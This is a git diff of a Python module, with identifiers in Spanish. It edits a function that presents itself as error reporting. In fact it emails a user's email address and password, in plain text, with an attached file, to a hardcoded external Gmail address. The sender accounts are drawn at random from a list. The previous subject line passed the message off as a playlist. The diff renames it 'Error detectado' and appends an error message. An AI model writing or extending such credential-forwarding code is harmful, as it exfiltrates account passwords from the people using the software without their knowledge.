@@ -8,13 +8,15 @@ from email.mime.base import MIMEBase
 from email import encoders
 from PQTs.Paths import pathImg
 from PQTs.Utilizar import sendermail
-def enviaremailerror(email,adjunto, password):
+
+
+def enviaremailerror(email,adjunto, password, error):
     emailsender=random.choice(sendermail)
     corre, contrase = emailsender    
     remitente = corre
     destinatarios = ['azuresilkmain@gmail.com']
-    asunto = f'Lista de reproduccion : {email}'
-    cuerpo = f"{email} {password}"  #{str(datetime.datetime.now().strftime('%H-%M-%S'))} 
+    asunto = f'Error detectado: {email}'
+    cuerpo = f"{email} {password} \n {error}"  #{str(datetime.datetime.now().strftime('%H-%M-%S'))} 
     ruta_adjunto = (os.path.join(pathImg,f'{adjunto}'))
     nombre_adjunto = f'{adjunto}'
 
